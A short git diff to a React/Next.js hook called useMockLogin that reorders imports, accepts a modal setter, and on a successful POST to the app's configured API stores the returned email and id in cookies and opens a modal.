@@ -1,9 +1,11 @@
-import { API_URL } from "../config";
-import { toast } from "react-toastify";
 import { useRouter } from "next/router";
+import { toast } from "react-toastify";
+import Cookies from "js-cookie";
+import { API_URL } from "../config";
 
-function useMockLogin() {
+function useMockLogin({ setShowModal }) {
   const {
+    push,
     query: { adminId, posterId },
   } = useRouter();
 
@@ -12,8 +14,6 @@ function useMockLogin() {
     // return;
 
     const url = `${API_URL}/ad/${adminId}/${posterId}`;
-
-    console.log(url);
 
     const res = await fetch(url, {
       method: "POST",
@@ -28,8 +28,10 @@ function useMockLogin() {
 
     if (res.ok) {
       console.log("success", data);
-      toast.success("Login Successfull");
-      formik.resetForm();
+      Cookies.set("email", data?.info?.email);
+      Cookies.set("id", data?.info?._id);
+
+      setShowModal(true);
     } else {
       console.log("error", data);
       toast.error("Something Went Wrong");
